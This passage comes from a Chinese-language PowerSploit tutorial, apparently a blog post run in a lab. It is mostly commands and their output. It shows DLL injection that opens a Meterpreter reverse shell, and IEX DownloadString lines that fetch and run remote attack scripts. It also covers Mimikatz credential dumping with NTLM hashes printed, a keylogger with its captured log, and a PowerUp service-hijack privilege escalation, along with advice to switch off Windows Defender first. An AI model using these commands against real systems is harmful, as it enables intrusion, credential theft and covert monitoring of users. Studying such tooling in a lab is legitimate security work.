<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">Invoke-DllInjection</span> <span class="n">-ProcessID</span> <span class="mf">4828</span> <span class="n">-Dll</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="py">dll</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="n">Size</span><span class="p">(</span><span class="n">K</span><span class="p">)</span> <span class="n">ModuleName</span>                                         <span class="n">FileName</span>
</span></span><span class="line"><span class="cl">   <span class="p">-------</span> <span class="p">----------</span>                                         <span class="p">--------</span>
</span></span><span class="line"><span class="cl">        <span class="mf">24</span> <span class="n">test</span><span class="p">.</span><span class="py">dll</span>                                           <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="py">dll</span>
</span></span></code></pre></div><p>Msf已反弹回来shell：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msf6 exploit(multi/handler) &gt; run
</span></span><span class="line"><span class="cl">[*] Started HTTPS reverse handler on https://172.16.0.107:4444
</span></span><span class="line"><span class="cl">[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: izi6c4ik) Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl">[*] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: izi6c4ik) Staging x64 payload (201308 bytes) ...
</span></span><span class="line"><span class="cl">[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: izi6c4ik) Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl">[*] Meterpreter session 3 opened (172.16.0.107:4444 -&gt; 127.0.0.1 ) at 2022-01-17 18:39:10 +0800
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></div><p>这个时候我们可以用微软官方的进程查看工具<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">process-explorer</a>，可以看到<code>notepad.exe</code>已经被加载<code>test.dll</code>而且查看调用该进程的dll有一条网络连接：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//2.png" alt=""></p>
<h3 id="invoke-portscan">Invoke-Portscan</h3>
<p>Invoke-Portscan是Recon模块下的一个脚本，主要用于端口扫描，使用起来也比较简单。使用方法如下</p>
<p>先下载脚本：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s2">&#34;http://172.16.0.107:8000/Recon/Invoke-Portscan.ps1&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>然后进行扫描：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">Invoke-Portscan</span> <span class="n">-Hosts</span> <span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">106</span> <span class="n">-Ports</span> <span class="s2">&#34;80,22,3389&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Hostname</span>      <span class="err">:</span> <span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">106</span>
</span></span><span class="line"><span class="cl"><span class="n">alive</span>         <span class="err">:</span> <span class="n">True</span>
</span></span><span class="line"><span class="cl"><span class="n">openPorts</span>     <span class="err">:</span> <span class="p">{</span><span class="mf">3389</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">closedPorts</span>   <span class="err">:</span> <span class="p">{</span><span class="mf">80</span><span class="p">,</span> <span class="mf">22</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">filter</span><span class="nb">edPorts</span> <span class="err">:</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="n">finishTime</span>    <span class="err">:</span> <span class="mf">2022</span><span class="p">/</span><span class="mf">1</span><span class="p">/</span><span class="mf">18</span> <span class="mf">1</span><span class="err">:</span><span class="mf">12</span><span class="err">:</span><span class="mf">46</span>
</span></span></code></pre></div><h3 id="invoke-mimikatz">Invoke-Mimikatz</h3>
<p>Invoke-Mimikatz是Exfiltration模块下的一个脚本。exe版本的mimikatz大家都很熟悉了，要想获取到凭证必须是管理员权限。</p>
<p>下载脚本之前要先关闭Windows defender的实时保护，要不然会被查杀掉的，下载命令：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s2">&#34;http://172.16.0.107:8000/Exfiltration/Invoke-Mimikatz.ps1&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>然后执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">Invoke-Mimikatz</span> <span class="n">-DumpCreds</span>
</span></span></code></pre></div><p>可以看到获取不到明文，但可以看到NTLM：</p>
<blockquote>
<p>当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。
但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span><span class="w"> </span><span class="o">-</span><span class="n">DumpCreds</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">.</span><span class="c1">#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="p">.</span><span class="c1">## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="c1">## / \ ##  /* * *
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="c1">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="s1">&#39;## v ##&#39;</span><span class="w">   </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="p">.</span><span class="n">gentilkiwi</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="nf">mimikatz</span><span class="w">             </span><span class="p">(</span><span class="n">oe</span><span class="p">.</span><span class="n">eo</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s1">&#39;#####&#39;</span><span class="w">                                     </span><span class="k">with</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="n">modules</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*/</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="n">mimikatz_initOrClean</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">CoInitializeEx</span><span class="p">:</span><span class="w"> </span><span class="mi">80010106</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nf">mimikatz</span><span class="p">(</span><span class="n">powershell</span><span class="p">)</span><span class="w"> </span><span class="c1"># sekurlsa::logonpasswords
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Authentication</span><span class="w"> </span><span class="n">Id</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">2672147</span><span class="w"> </span><span class="p">(</span><span class="mi">00000000</span><span class="p">:</span><span class="mi">0028</span><span class="n">c613</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Session</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="n">Interactive</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">3</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">User</span><span class="w"> </span><span class="n">Name</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="n">DWM</span><span class="o">-</span><span class="mi">3</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Domain</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="n">Window</span><span class="w"> </span><span class="n">Manager</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Logon</span><span class="w"> </span><span class="n">Server</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="no">null</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Logon</span><span class="w"> </span><span class="kt">Time</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="mi">2022</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">05</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SID</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">90</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">3</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">msv</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">tspkg</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">wdigest</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">WIN</span><span class="o">-</span><span class="n">I1OIAEUTNT1</span><span class="err">$</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Domain</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="n">WORKGROUP</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Password</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="no">null</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">kerberos</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ssp</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">credman</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Authentication</span><span class="w"> </span><span class="n">Id</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">215152</span><span class="w"> </span><span class="p">(</span><span class="mi">00000000</span><span class="p">:</span><span class="mi">00034870</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Session</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="n">Interactive</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">User</span><span class="w"> </span><span class="n">Name</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="n">Administrator</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Domain</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="n">WIN</span><span class="o">-</span><span class="n">I1OIAEUTNT1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Logon</span><span class="w"> </span><span class="n">Server</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="n">WIN</span><span class="o">-</span><span class="n">I1OIAEUTNT1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Logon</span><span class="w"> </span><span class="kt">Time</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="mi">2022</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">55</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SID</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3896163557</span><span class="o">-</span><span class="mi">1645138957</span><span class="o">-</span><span class="mi">2306563325</span><span class="o">-</span><span class="mi">500</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">msv</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="p">[</span><span class="mi">00000003</span><span class="p">]</span><span class="w"> </span><span class="k">Primary</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">Administrator</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Domain</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="n">WIN</span><span class="o">-</span><span class="n">I1OIAEUTNT1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">NTLM</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="n">de26cce0356891a4a020e7c4957afc72</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">SHA1</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="mi">8252</span><span class="n">ce88ea5c224541baf0401452d2f6a501f03c</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">tspkg</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">wdigest</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">Administrator</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Domain</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="n">WIN</span><span class="o">-</span><span class="n">I1OIAEUTNT1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Password</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="no">null</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">kerberos</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">Administrator</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Domain</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="n">WIN</span><span class="o">-</span><span class="n">I1OIAEUTNT1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="n">Password</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="no">null</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ssp</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">credman</span><span class="w"> </span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">...</span><span class="w">
</span></span></span></code></pre></div><h3 id="get-keystrokes">Get-Keystrokes</h3>
<p>Get-Keystrokes是Exfiltration模块下的一个脚本，用于键盘记录，功能相当强大，不仅有键盘输入记录，甚至能记录鼠标的点击情况，还能记录详细的时间，实战时可以直接放入后台运行：</p>
<p>同样是先下载脚本：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s2">&#34;http://172.16.0.107:8000/Exfiltration/Get-Keystrokes.ps1&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>然后执行命令开启记录：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">Get-Keystrokes</span> <span class="n">-LogPath</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="py">txt</span>
</span></span></code></pre></div><p>随便按些键盘，然后去查看<code>test.txt</code>文件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;TypedKey&#34;,&#34;WindowTitle&#34;,&#34;Time&#34;
</span></span><span class="line"><span class="cl">&#34;a&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:44&#34;
</span></span><span class="line"><span class="cl">&#34;x&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:44&#34;
</span></span><span class="line"><span class="cl">&#34;i&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:44&#34;
</span></span><span class="line"><span class="cl">&#34;i&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:45&#34;
</span></span><span class="line"><span class="cl">&#34;w&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:45&#34;
</span></span><span class="line"><span class="cl">&#34;o&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:45&#34;
</span></span><span class="line"><span class="cl">&#34;e&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:45&#34;
</span></span><span class="line"><span class="cl">&#34;0&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:45&#34;
</span></span><span class="line"><span class="cl">&#34;2&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:45&#34;
</span></span><span class="line"><span class="cl">&#34;9&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:45&#34;
</span></span><span class="line"><span class="cl">&#34;0&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:46&#34;
</span></span><span class="line"><span class="cl">&#34;2&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:46&#34;
</span></span><span class="line"><span class="cl">&#34;9&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:46&#34;
</span></span><span class="line"><span class="cl">&#34;0&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:46&#34;
</span></span><span class="line"><span class="cl">&#34;j&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:46&#34;
</span></span><span class="line"><span class="cl">&#34;l&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:46&#34;
</span></span><span class="line"><span class="cl">&#34;j&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:46&#34;
</span></span><span class="line"><span class="cl">&#34;f&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:48&#34;
</span></span><span class="line"><span class="cl">&#34;&lt;Enter&gt;&#34;,&#34;管理员: Windows PowerShell&#34;,&#34;2022/1/18 1:23:50&#34;
</span></span></code></pre></div><h3 id="powerup攻击模块实战1">PowerUp攻击模块实战1</h3>
<p>PowerUp是Privesc模块下的一个脚本，功能相当强大，拥有众多用来寻找目标主机Windows服务漏洞进行提权的实用脚本。</p>
<p>通常，在Windows下可以通过内核漏洞来提升权限。但是，我们常常会碰到无法通过内核漏洞提权所处服务器的情况，这个时候就需要利用脆弱的Windows服务提权，或者利用常见的系统服务，通过其继承的系统权限来完成提权等，此框架可以在内核提权行不通的时候，帮助我们寻找服务器的脆弱点，进而同脆弱点实现提权的目的。</p>
<p>书中用到的是一款OmniServer的软件，但是我们可以自己模拟一个简单的实验环境。</p>
<p>这个实战的意义是在：管理员或者是软件添加了一个启动项，而且这个软件还是给了用户所有的权限，我们就可以对该文件进行读写改造成我们的恶意程序，当服务重启或者是计算机重启服务自动启动的时候就能触发我们的恶意程序，下面我们先来模拟跟书中差不多的环境。</p>
<ol>
<li>
<p>添加服务</p>
<p>我这里是用来Windows系统里面的系统文件<code>C:\Windows\hh.exe</code>当然你们也可以用其他notepad、cmd都行，把它移动到<code>C:\hh.exe</code></p>
<p>然后执行命令：</p>
<p><code>sc create hh binpath= C:\hh.exe type= own start= auto displayname= hh</code></p>
<p>我们可以看到在服务管理工具中新增了一项名为<code>hh</code>的服务：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//4.png" alt="4"></p>
</li>
<li>
<p>赋予权限</p>
<p>这里我们给用户组具有<code>hh.exe</code>完全的修改权限：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//3.png" alt=""></p>
</li>
<li>
<p>新建一个普通用户</p>
<p>这个用户用来测试提权的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="n">net</span> <span class="n">user</span> <span class="n">test</span> <span class="n">p</span><span class="nv">@ssw0rd</span> <span class="p">/</span><span class="n">add</span>
</span></span></code></pre></div><p>让用户拥有关机的权限：</p>
<p>打开安全策略：win+R-&gt;secpol.msc</p>
<p>打开本地策略-&gt;用户权限分配-&gt;关闭系统-&gt;添加用户或用户组-&gt;高级-&gt;立即查找-&gt;选择test用户</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//5.png" alt="5"></p>
<p>如果要远程连接过来就加入远程桌面用户组</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="n">net</span> <span class="n">localgroup</span> <span class="s2">&#34;Remote Desktop Users&#34;</span> <span class="n">test</span> <span class="p">/</span><span class="n">add</span>
</span></span></code></pre></div></li>
</ol>
<p>这样我们的漏洞环境就部署成功了！</p>
<p>下面我们切换到普通用户进行实战操作，先下载并加载攻击脚本：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">&gt;</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s2">&#34;http://172.16.0.107:8000/Privesc/PowerUp.ps1&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>执行所有的检测模块：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">&gt;</span> <span class="nb">Invoke-AllChecks</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ServiceName</span>                     <span class="err">:</span> <span class="n">hh</span>
</span></span><span class="line"><span class="cl"><span class="n">Path</span>                            <span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">hh</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">ModifiableFile</span>                  <span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">hh</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">ModifiableFilePermissions</span>       <span class="err">:</span> <span class="p">{</span><span class="n">WriteOwner</span><span class="p">,</span> <span class="n">Delete</span><span class="p">,</span> <span class="n">WriteAttributes</span><span class="p">,</span> <span class="n">Synchronize</span><span class="p">...}</span>
</span></span><span class="line"><span class="cl"><span class="n">ModifiableFileIdentityReference</span> <span class="err">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span>
</span></span><span class="line"><span class="cl"><span class="n">StartName</span>                       <span class="err">:</span> <span class="n">LocalSystem</span>
</span></span><span class="line"><span class="cl"><span class="n">AbuseFunction</span>                   <span class="err">:</span> <span class="nb">Install-ServiceBinary</span> <span class="n">-Name</span> <span class="s1">&#39;hh&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">CanRestart</span>                      <span class="err">:</span> <span class="n">False</span>
</span></span><span class="line"><span class="cl"><span class="n">Name</span>                            <span class="err">:</span> <span class="n">hh</span>
</span></span><span class="line"><span class="cl"><span class="n">Check</span>                           <span class="err">:</span> <span class="n">Modifiable</span> <span class="n">Service</span> <span class="n">Files</span>
</span></span></code></pre></div><p>我们可以看到已经扫描出服务<code>hh</code>存在漏洞，<code>AbuseFunction</code>是利用的方法，我们使用里面推荐的方法去利用：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">&gt;</span> <span class="nb">Install-ServiceBinary</span> <span class="n">-Name</span> <span class="s1">&#39;hh&#39;</span> <span class="n">-UserName</span> <span class="s2">&#34;admin&#34;</span> <span class="n">-Password</span> <span class="s2">&#34;p@ssw0rd&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">Copy-Item</span> <span class="err">:</span> <span class="n">对路径</span><span class="err">“</span><span class="n">C:</span><span class="p">\</span><span class="n">hh</span><span class="p">.</span><span class="py">exe</span><span class="p">.</span><span class="n">bak</span><span class="err">”</span><span class="n">的访问被拒绝</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="n">所在位置</span> <span class="n">行</span><span class="err">:</span><span class="mf">2854</span> <span class="n">字符</span><span class="err">:</span> <span class="mf">13</span>
</span></span><span class="line"><span class="cl"><span class="p">+</span>             <span class="nb">Copy-Item</span> <span class="n">-Path</span> <span class="nv">$ServicePath</span> <span class="n">-Destination</span> <span class="nv">$BackupPath</span> <span class="n">-Fo</span> <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">+</span>             <span class="p">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
</span></span><span class="line"><span class="cl">    <span class="p">+</span> <span class="n">CategoryInfo</span>          <span class="err">:</span> <span class="n">PermissionDenied</span><span class="err">:</span> <span class="p">(</span><span class="n">C:</span><span class="p">\</span><span class="n">hh</span><span class="p">.</span><span class="n">exe</span><span class="err">:</span><span class="n">FileInfo</span><span class="p">)</span> <span class="p">[</span><span class="nb">Copy-Item</span><span class="p">],</span> <span class="n">UnauthorizedAccessException</span>
